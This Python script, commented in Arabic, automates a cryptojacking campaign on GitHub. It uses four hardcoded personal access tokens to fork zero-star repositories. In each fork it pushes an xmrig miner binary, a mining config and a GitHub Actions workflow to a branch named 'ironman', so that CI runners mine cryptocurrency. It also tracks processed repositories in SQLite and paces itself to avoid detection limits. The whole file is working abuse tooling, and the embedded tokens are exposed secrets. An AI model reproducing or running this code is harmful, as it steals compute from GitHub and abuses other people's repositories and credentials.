import os
import sqlite3
import time
from datetime import datetime, timedelta
from github import Github

# إعداد GitHub Token
GITHUB_TOKENS = [
    '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',
    "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",
    "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",
    "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",
]
WORKER_ID = "github-actions"
DB_NAME = "processed_repos.db"
CONFIG_JSON = "config.json"
MAIN_YAML = ".github/workflows/main.yml"
XMRIG_BINARY = "xmrig"

# وقت الانتظار بين العمليات (بالثواني)
FORK_LIMIT = 5
FORK_WAIT = 60
BRANCH_WAIT = 20
FILE_UPLOAD_WAIT = 20

def setup_database():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS processed_repos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            full_name TEXT NOT NULL UNIQUE,
            branch_created BOOLEAN DEFAULT FALSE,
            processed_date DATETIME DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    conn.commit()
    conn.close()

def mark_processed(repo_full_name, branch_created=False):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO processed_repos (full_name, branch_created, processed_date)
        VALUES (?, ?, ?)
    ''', (repo_full_name, branch_created, datetime.now()))
    conn.commit()
    conn.close()

def is_processed(repo_full_name):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('SELECT processed_date FROM processed_repos WHERE full_name = ?', (repo_full_name,))
    result = c.fetchone()
    conn.close()

    if result:
        last_processed_date = datetime.strptime(result[0], "%Y-%m-%d %H:%M:%S.%f")
        if datetime.now() - last_processed_date > timedelta(days=32):
            return False
        return True
    return False

def branch_exists(repo, branch_name):
    try:
        repo.get_git_ref(f"heads/{branch_name}")
        return True
    except:
        return False

def check_workflow_status(github):
    user = github.get_user()
    in_progress = 0
    queued = 0

    for repo in user.get_repos():
        workflows = repo.get_workflows()
        for workflow in workflows:
            runs = workflow.get_runs(status="in_progress")
            in_progress += runs.totalCount
            queued += workflow.get_runs(status="queued").totalCount

    print(f"Current Workflow Status: {in_progress} in progress, {queued} queued.")
    return in_progress, queued

def retry(func, retries=3, delay=5):
    for i in range(retries):
        try:
            return func()
        except Exception as e:
            print(f"Attempt {i+1} failed: {e}")
            time.sleep(delay)
    print(f"Failed after {retries} attempts.")
    return None

def process_repositories(github, token):
    repos = github.search_repositories(query="stars:0", sort="updated", order="desc")
    forks_created = 0

    for repo in repos:
        if forks_created >= FORK_LIMIT:
            print(f"Reached the limit of {FORK_LIMIT} forks for this token.")
            break

        if is_processed(repo.full_name):
            print(f"Repository {repo.full_name} already processed recently. Skipping...")
            continue

        if repo.size == 0:
            print(f"Repository {repo.full_name} is empty. Skipping...")
            continue

        print(f"Forking repository: {repo.full_name}")
        fork = retry(lambda: repo.create_fork())
        if not fork:
            continue

        # Wait after fork
        print(f"Waiting {FORK_WAIT} seconds after forking...")
        time.sleep(FORK_WAIT)

        print(f"Creating branch 'ironman' in {fork.full_name}")
        if branch_exists(fork, "ironman"):
            print(f"Branch 'ironman' already exists in {fork.full_name}. Skipping branch creation...")
        else:
            try:
                repo_git = fork.get_git_ref(f"heads/{fork.default_branch}")
                fork.create_git_ref(ref="refs/heads/ironman", sha=repo_git.object.sha)
            except Exception as e:
                print(f"Error creating branch 'ironman' in {fork.full_name}: {e}")
                continue

        # Wait after creating branch
        print(f"Waiting {BRANCH_WAIT} seconds after creating branch...")
        time.sleep(BRANCH_WAIT)

        print(f"Adding files to repository: {fork.full_name}")
        try:
            fork.create_file(CONFIG_JSON, "Add config", open(CONFIG_JSON).read(), branch="ironman")
            time.sleep(FILE_UPLOAD_WAIT)

            fork.create_file(XMRIG_BINARY, "Add binary", open(XMRIG_BINARY, "rb").read(), branch="ironman")
            time.sleep(FILE_UPLOAD_WAIT)

            fork.create_file(MAIN_YAML, "Add workflow", open(MAIN_YAML).read(), branch="ironman")
            time.sleep(FILE_UPLOAD_WAIT)

        except Exception as e:
            print(f"Failed to add files to {fork.full_name}: {e}")
            continue

        print(f"Mining setup completed for {fork.full_name}")
        mark_processed(repo.full_name, branch_created=True)
        forks_created += 1

        # Delay between repositories
        print(f"Waiting {FORK_WAIT} seconds before processing the next repository...")
        time.sleep(FORK_WAIT)

def main():
    setup_database()

    for token in GITHUB_TOKENS:
        github = Github(token)
        print(f"Using token: {token[:10]}...")

        in_progress, queued = check_workflow_status(github)
        if in_progress > 0 or queued > 0:
            print("There are workflows currently running or queued. Waiting for them to complete...")
            time.sleep(600)  # Wait for 10 minutes before retrying
            continue

        process_repositories(github, token)
        in_progress, queued = check_workflow_status(github)
        print(f"After processing: {in_progress} in progress, {queued} queued.")

if __name__ == "__main__":
    main()